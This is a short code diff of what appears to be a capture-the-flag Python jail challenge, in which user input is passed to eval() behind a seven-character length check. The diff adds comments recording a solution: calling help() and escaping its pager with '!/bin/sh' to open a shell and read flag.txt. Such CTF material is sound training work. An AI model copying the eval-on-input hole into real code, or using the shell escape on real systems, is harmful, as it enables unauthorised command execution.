@@ -21,3 +21,7 @@ if len(input_data)>7:
     print("Oh hacker!")
     exit(0)
 print('Answer: {}'.format(eval(input_data)))
+
+
+# help() --> +
+# !/bin/sh --> cat "flag.txt"
